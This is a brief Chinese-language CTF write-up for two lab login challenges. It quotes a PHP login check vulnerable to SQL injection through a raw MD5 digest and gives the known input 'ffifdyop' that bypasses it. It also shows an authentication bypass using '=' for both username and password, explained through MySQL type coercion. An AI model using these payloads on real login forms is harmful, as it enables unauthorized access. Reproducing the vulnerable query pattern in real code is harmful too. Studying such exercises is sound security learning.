

# 后台登录
http://www.shiyanbar.com/ctf/2036

php 处理password的代码如下：
```php
<!-- $password=$_POST['password'];
$sql = "SELECT * FROM admin WHERE username = 'admin' and password = '".md5($password,true)."'";
$result=mysqli_query($link,$sql);
    if(mysqli_num_rows($result)>0){
        echo 'flag is :'.$flag;
    }
    else{
        echo '密码错误!';
    } -->
```

```php
$sql = "SELECT * FROM admin WHERE username = 'admin' and password = '".md5($password,true)."'";
该语句构建sql查询， php的.操作符表示字符串拼接, 字符串由下面三个部分构成
1) "SELECT * FROM admin WHERE username = 'admin' and password = '"
2) md5($password,true)
3) "'"
md5($password,true) 函数， MD5报文摘要将以16字节长度的原始二进制格式返回， 然后被转换成字符串
```
寻找$password输入，使得md5返回字符串完成sql注入
```php
<?php
$password = "ffifdyop";
echo md5($password,true);
?>

输出：
'or'6�]��!r,��b
```

# sql 注入
# 登陆一下好吗??
http://www.shiyanbar.com/ctf/1942

username:'='

password:'='

```sql
create table users(username char(20), password char(20));
insert into users values("admin", "admin");
select * from users where username=''='' and password=''=''; 
# username='' 的结果为0， 0=''比较时，字符串被转为int时变为0， 0=0结果为true
```